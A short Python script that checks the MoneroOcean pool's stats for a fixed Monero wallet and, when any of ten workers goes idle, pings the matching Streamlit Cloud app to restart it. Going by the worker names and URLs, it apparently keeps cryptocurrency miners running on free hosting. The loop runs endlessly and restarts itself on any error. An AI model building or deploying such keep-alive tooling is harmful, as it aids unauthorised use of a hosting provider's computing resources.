import requests
import streamlit as st 
import json
import time
from multiprocessing import Process

pool = "https://api.moneroocean.stream/miner/"
addr ="49FrBm432j9fg33N8PrwSiSig7aTrxZ1wY4eELssmkmeESaYzk2fPkvfN7Kj4NHMfH11NuhUAcKc5DkP7jZQTvVGUnD243g"
stats ="/stats/"


def resp(worker):
  
  host = pool + addr + stats + worker
  res = requests.get(host)
  time.sleep(10)
  jde = json.loads(str(res.text))
  workt = jde[("lts")]
  t = time.time()
  lst = t - workt
  lstnt = lst / 60
  if lstnt >= 30:
    #mv4
    if worker == "mv8gen1":
      requests.get("https://vyom00907-mv8-mv8gen1-38nqsd.streamlit.app/")
    if worker == "mv8gen2":
      requests.get("https://vyom00907-mv8-mv8gen2-f8pq0a.streamlit.app/")
    if worker == "mv8gen3":
      requests.get("https://vyom00907-mv8-mv8gen3-sq83p2.streamlit.app/")
    if worker == "mv8gen4":
      requests.get("https://vyom00907-mv8-mv8gen4-q5cw86.streamlit.app/")
    if worker == "mv8gen5":
      requests.get("https://vyom00907-mv8-mv8gen5-zu83q6.streamlit.app/")
    if worker == "mv8gen6":
      requests.get("https://vyom00907-mv8-mv8gen6-x54av5.streamlit.app/")
    if worker == "mv8gen7":
      requests.get("https://vyom00907-mv8-mv8gen7-7et3rp.streamlit.app/")
    if worker == "mv8gen8":
      requests.get("https://vyom00907-mv8-mv8gen8-4ud2cs.streamlit.app/")
    if worker == "mv8gen9":
      requests.get("https://vyom00907-mv8-mv8gen9-2epvsu.streamlit.app/")
    if worker == "mv8gen10":
      requests.get("https://vyom00907-mv8-mv8gen10-hce1rj.streamlit.app/")
    
      

def stch():
    while 1==1 :
      
      #mv4
      resp("mv8gen1")
      resp("mv8gen2")
      resp("mv8gen3")
      resp("mv8gen4")
      resp("mv8gen5")
      resp("mv8gen6")
      resp("mv8gen7")
      resp("mv8gen8")
      resp("mv8gen9")
      resp("mv8gen10")

def ch():
  try:
    stch()
  except:
    ch()

  
proc = Process(target=ch ,args=())
proc.start()

  
